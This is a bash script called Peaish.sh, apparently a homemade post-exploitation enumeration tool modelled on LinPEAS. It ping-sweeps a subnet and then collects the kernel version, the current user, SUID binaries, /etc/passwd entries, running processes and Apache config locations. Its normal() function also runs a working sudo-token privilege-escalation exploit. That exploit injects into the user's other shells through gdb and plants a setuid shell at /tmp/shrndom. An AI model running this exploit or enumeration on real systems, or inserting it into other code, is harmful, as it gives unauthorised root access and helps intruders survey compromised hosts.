#!/bin/bash

#NEED TO ADD MULTITHREADING!

#Display Help
 function Help()
 {
echo "$(tput setaf 0)$(tput setab 2)"
  echo "              ####  ##### #####        ###### ##### #   #                "
  echo "              #   # #     #   #          ##   #     #   #                "
  echo "              ####  ##### ##### ======   ##   ##### #####                "
  echo "              #     #     #   #          ##       # #   #                "
  echo "              #     ##### #   #        ###### ##### #   #                "
  echo "$(tput setaf 0)$(tput setab 4)"
  echo "------------------------------------------------------------------------- "
  echo "|        Quick Enumeration For When You're Deep In The System           | "
  echo "------------------------------------------------------------------------- "
  echo "$(tput setaf 0)$(tput setab 2)"
  echo "######################################################################### "
  echo "#./Peaish.sh -h or --help                          Display Help Text    # "
  echo "#./Peaish.sh -o or --output (filename) + IP        Writes Output To File# "
  echo "#./Peaish.sh -v or --verbose + IP                  Verbose Mode         # "
  echo "#                                                                       # "
  echo "# DONT FORGET TO ADD THE FIRST THREE NUMBERS OF THE MACHINES IP ADDRESS # "
  echo "# example:                                                              # "
  echo "#         ./Peaish.sh -v 192.168.1                                      # "
  echo "######################################################################### "

  echo "$(tput sgr 0)"
  echo ""
  exit
 }


#Write To File
function to_file ()
{

echo "$(tput setaf 0)$(tput setab 2)"
  echo "              ####  ##### #####        ###### ##### #   #                "
  echo "              #   # #     #   #          ##   #     #   #                "
  echo "              ####  ##### ##### ======   ##   ##### #####                "
  echo "              #     #     #   #          ##       # #   #                "
  echo "              #     ##### #   #        ###### ##### #   #                "
  echo "$(tput setaf 0)$(tput setab 4)"
  echo "------------------------------------------------------------------------- "
  echo "|        Quick Enumeration For When You're Deep In The System           | "
  echo "------------------------------------------------------------------------- "
  echo "$(tput setaf 0)$(tput setab 2)"
  echo "######################################################################### "
  echo "#./Peaish.sh -h or --help                          Display Help Text    # "
  echo "#./Peaish.sh -o or --output (filename) + IP        Writes Output To File# "
  echo "#./Peaish.sh -v or --verbose + IP                  Verbose Mode         # "
  echo "#                                                                       # "
  echo "# DONT FORGET TO ADD THE FIRST THREE NUMBERS OF THE MACHINES IP ADDRESS # "
  echo "# example:                                                              # "
  echo "#         ./Peaish.sh -v 192.168.1                                      # "
  echo "######################################################################### "

  echo ""

#Tidy This nonsence Up...eww!!!

           printf "Writing Results To "$filename" "
           for i in {1..254} ;do ping -c 1 $IP.$i | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & done >> $filename
           echo " " >> "$filename"
           uname -r >> "$filename"
           echo "" >> "$filename"
           whoami >> "$filename"
            echo "" >> "$filename"
           find / -perm -u=s -type f 2>/dev/null >> "$filename"
           echo"" >> "$filename"
           awk -F/ '$NF != "nologin"' /etc/passwd >> "$filename"
           echo"" >> "$filename"
          ps aux >> "$filename" 
          echo"" >> "$filename"
          FILE1=/etc/apache2/httpd.conf
              if test -f "$FILE1"; then
                echo "$FILE1 exists." >> "$filename"
              else echo "$FILE1 not found" >> "$filename"
              fi
          FILE2=/etc/apache2/apache2.conf
              if test -f "$FILE2"; then
                echo "$FILE2 exists." >> "$filename"
              else echo "$FILE2 not found" >> "$filename"
              fi
          FILE3=/etc/httpd/httpd.conf
              if test -f "$FILE3"; then
                echo "$FILE3 exists." >> "$filename"
              else echo "$FILE3 not found" >> "$filename"
              fi
          FILE4=/etc/httpd/conf/httpd.conf
              if test -f "$FILE4"; then
                echo "$FILE4 exists." >> "$filename"
              else echo "$FILE4 not found" >> "$filename"
              fi
              echo ""
exit 
}


#Verbose Or No Arguments
function normal(){

echo "$(tput setaf 0)$(tput setab 2)"
  echo "              ####  ##### #####        ###### ##### #   #                "
  echo "              #   # #     #   #          ##   #     #   #                "
  echo "              ####  ##### ##### ======   ##   ##### #####                "
  echo "              #     #     #   #          ##       # #   #                "
  echo "              #     ##### #   #        ###### ##### #   #                "
  echo "$(tput setaf 0)$(tput setab 4)"
  echo "------------------------------------------------------------------------- "
  echo "|        Quick Enumeration For When You're Deep In The System           | "
  echo "------------------------------------------------------------------------- "
  echo "$(tput setaf 0)$(tput setab 2)"
  echo "######################################################################### "
  echo "#./Peaish.sh -h or --help                          Display Help Text    # "
  echo "#./Peaish.sh -o or --output (filename) + IP        Writes Output To File# "
  echo "#./Peaish.sh -v or --verbose + IP                  Verbose Mode         # "
  echo "#                                                                       # "
  echo "# DONT FORGET TO ADD THE FIRST THREE NUMBERS OF THE MACHINES IP ADDRESS # "
  echo "# example:                                                              # "
  echo "#         ./Peaish.sh -v 192.168.1                                      # "
  echo "######################################################################### "

  echo ""
 
echo "$(tput setaf 4)$(tput setab 2)                                                $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ~~~~          V1.0           ~~~~       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)                                                $(tput sgr 0)"


echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ####   Dirty Network Scan    ####       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"

#Add Port Scan For All Found IPs
for i in {1..254} ;do ping -c 1 $IP.$i | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & done > Network.txt
  cat Network.txt
echo "IP Adresses saved to Network.txt"


echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ##########Linux Version##########       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
uname -r


echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ##########Who-TF-am-I????########       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
whoami
id

echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ##########Grabbing SUIDs#########       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
#ls -la /usr/bin/
find / -perm -u=s -type f 2>/dev/null

echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        #########Grabbing Passwd#########       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        #########   No Nologin   ########       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
#cat /etc/passwd
awk -F/ '$NF != "nologin"' /etc/passwd

echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ########Running Processes########       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
ps aux

echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ########    Apache???    ########       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
FILE1=/etc/apache2/httpd.conf
if test -f "$FILE1"; then
    echo "$FILE1 exists."
  else echo "$FILE1 not found"
fi
FILE2=/etc/apache2/apache2.conf
if test -f "$FILE2"; then
    echo "$FILE2 exists."
  else echo "$FILE2 not found"
fi
FILE3=/etc/httpd/httpd.conf
if test -f "$FILE3"; then
    echo "$FILE3 exists."
  else echo "$FILE3 not found"
fi
FILE4=/etc/httpd/conf/httpd.conf
if test -f "$FILE4"; then
    echo "$FILE4 exists."
  else echo "$FILE4 not found"
fi

#Code Totally Taken From Linpeas #NoShame
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        ########SUDO Token Vuln??########       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"

    echo "Checking for sudo tokens in other shells owned by current user"

    for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" 2>/dev/null | grep -v "^$$\$"); do

      echo "Injecting process $pid -> "$(cat "/proc/$pid/comm" 2>/dev/null)

      echo 'call system("echo | sudo -S cp /bin/sh /tmp/shrndom >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/shrndom >/dev/null 2>&1")' | gdb -q -n -p "$pid" >/dev/null 2>&1

    done

    if [ -f "/tmp/shrndom" ]; then 

      echo "Sudo tokens exploit worked, you can escalate privileges using '/tmp/shrndom -p'" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,";

    else echo "The escalation didn't work maybe try again later...Or It Could Be My Crappy Code"

    fi


  echo ""


echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        #            PEA-ISH            #       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        #            PEA-ISH            #       $(tput sgr 0)"
echo "$(tput setaf 0)$(tput setab 4)        #            PEA-ISH            #       $(tput sgr 0)"
echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
exit
}

#Arguments
   if [[ -z "$1" ]] ; then
      Help
   fi
while [ ! -z "$1" ] ; do
  case "$1" in
    --help|-h)
      shift
      Help
      ;;
    --output|-o)
      IP=$3
      filename=$2
      shift
      to_file
      ;;
    --verbose|-v)
      IP=$2
      shift
      normal
      ;;
    -*)
      echo "Not Like That Duffus! Check The Help"
      shift
      Help
      ;;
    esac
shift
done

